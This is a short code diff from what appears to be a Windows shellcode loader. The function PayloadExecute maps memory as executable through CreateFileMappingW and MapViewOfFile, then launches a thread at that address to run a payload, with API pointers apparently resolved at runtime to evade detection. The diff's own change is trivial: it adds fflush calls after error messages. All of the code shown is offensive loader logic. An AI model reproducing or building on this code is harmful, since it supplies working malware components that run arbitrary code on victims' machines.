@@ -13,11 +13,13 @@ BOOL PayloadExecute( IN OPTIONAL HANDLE hProcess,  IN OPTIONAL HANDLE hThread, I
 
 	if (!(hMappingFile = pCreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0x00, sShellcodeSize, NULL))) {
 		printf("[!] CreateFileMappingW Failed With Error: %d \n", GetLastError());
+		fflush(stdout);
 		goto _END_OF_FUNC;
 	}
 
 	if (!(pMappingAddress = (PBYTE)MapViewOfFile(hMappingFile, FILE_MAP_WRITE | FILE_MAP_EXECUTE, 0x00, 0x00, sShellcodeSize))) {
 		printf("[!] MapViewOfFile Failed With Error: %d \n", GetLastError());
+		fflush(stdout);
 		goto _END_OF_FUNC;
 	}
 
@@ -25,6 +27,7 @@ BOOL PayloadExecute( IN OPTIONAL HANDLE hProcess,  IN OPTIONAL HANDLE hThread, I
 
     if (!(hThread = pCreateThread(NULL, 0x00, (LPTHREAD_START_ROUTINE)pMappingAddress, NULL, 0x00, NULL))) {
 		printf("[!] CreateThread Failed With Error: %d\n", GetLastError());
+		fflush(stdout);
 		return FALSE;
 	}
 
